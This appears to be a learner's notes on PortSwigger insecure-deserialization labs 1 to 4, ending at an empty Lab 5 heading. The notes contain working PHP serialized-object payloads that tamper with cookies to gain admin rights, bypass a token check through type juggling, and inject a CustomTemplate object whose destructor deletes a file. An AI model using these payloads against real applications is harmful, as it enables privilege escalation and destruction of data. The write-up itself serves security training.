[PortSwigger Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[PortSwigger Labs](https://portswigger.net/web-security/deserialization)

## Insecure deserialization

### Lab 01: Modifying serialized objects
[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)


![](imgs/2023-10-23-16-53-02.png)

![](imgs/2023-10-23-16-54-50.png)

```
Cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d

B64 Decode: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

![](imgs/2023-10-23-17-04-15.png)

![](imgs/2023-10-23-16-58-15.png)

![](imgs/2023-10-23-16-58-45.png)

### Lab 02: Modifying serialized data types
[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)



![](imgs/2023-10-23-17-07-16.png)

```
Cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0aHVzYjdoeXIyd28yOTF0bGNkaWJkYmEweWoydzRjbiI7fQ%3d%3d

B64 Decode: 
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"thusb7hyr2wo291tlcdibdba0yj2w4cn";}
```

I try to put 'administrator' in the cookie

```
RAW: 
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";s:32:"thusb7hyr2wo291tlcdibdba0yj2w4cn";}
-> Cookie: 
```
![](imgs/2023-10-24-17-01-07.png)

i got an error:
![](imgs/2023-10-24-17-03-40.png)

So i imagine that there is a php script that compare the $user->access_token vs $access_token[i]. But the server doesn't check type of $user->access_token. 
-> [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

I replace the token string in the cookie with an interger.

```
RAW:
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
Cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9Cg%3D%3D
```
I have admin access.
![](imgs/2023-10-24-17-24-56.png)


![](imgs/2023-10-24-17-25-21.png)

### Lab 03: Using application functionality to exploit insecure deserialization
[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

[Insecure deserialization](https://portswigger.net/web-security/deserialization)

Lab description:
```
This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.
You can log in to your own account using the following credentials: wiener:peter
You also have access to a backup account: gregg:rosebud
```

![](imgs/2023-10-26-11-00-50.png)

I uploaded an image as avatar to the server. The cookie now contains the image path
```
Value:
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2ZWtwODNzeDFnamhpYTMyaGNhaWduOHB6cDlheTJ0NCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
B64Decode:
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vekp83sx1gjhia32hcaign8pzp9ay2t4";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

So i tried to change the avatar path to something :v
```
Value: 
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vekp83sx1gjhia32hcaign8pzp9ay2t4";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
Cookie:
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2ZWtwODNzeDFnamhpYTMyaGNhaWduOHB6cDlheTJ0NCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

And now i need to remove the wiener account inorder to remove the wiener avatar (/home/carlos/morale.txt) ? 

![](imgs/2023-10-26-11-13-18.png)

### Lab 04: Arbitrary object injection in PHP
[Link](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

Cookie:
```
Value:
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkZGVvbjV0NW80OGp3MGluaXl6aGwwbjlvMzA2czc4YiI7fQ%3d%3d
B64Decode:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ddeon5t5o48jw0iniyzhl0n9o306s78b";}
```

Maybe this is a hint...
![](imgs/2023-10-26-11-18-53.png)

Try to get /libs/CustomTemplate.php but its empty. However, I scan all possible backup files and found it:
![](imgs/2023-10-26-12-24-59.png)
![](imgs/2023-10-26-11-31-45.png)

/libs/CustomTemplate.php~ (This is the backup file generated by vi)
```

<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

The __destruct() method is called when the object is destroyed. It checks if the lock file exists and deletes it if it does.
-> That is the point we want

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```

![](imgs/2023-10-26-13-03-14.png)

### Lab 05: 